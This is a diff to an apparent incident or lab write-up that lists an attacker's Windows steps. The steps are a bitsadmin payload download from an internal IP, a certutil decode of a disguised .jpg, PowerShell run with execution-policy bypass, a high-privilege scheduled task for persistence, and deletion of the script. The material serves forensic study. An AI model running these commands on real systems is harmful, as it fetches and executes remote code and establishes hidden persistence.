@@ -18,14 +18,16 @@ bitsadmin /transfer Nothing /download /priority normal http://172.18.35.10:8000/
 certutil -decode amanwhogetsnorest.jpg normal.zip 1>nul
 </pre>
 3. Opened the command prompt to run z.ps1 from PowerShell
-
+<pre>
+cmd /c "powershell -NOP -EP Bypass C:\Windows\Temp\z.ps1"
+</pre>
 4. Created a scheduled  \whoisthebaba
 <pre>
 schtasks /create /sc minute /mo 3 /tn "whoisthebaba" /tr C:\Windows\Temp\run.bat /RL HIGHEST
 </pre>
 5. Deleted z.ps1
 <pre>
-cmd /c "powershell -NOP -EP Bypass C:\Windows\Temp\z.ps1"
+del z.ps1
 </pre>
 6. delete amanwhogetsnorest.jpg
 <pre>
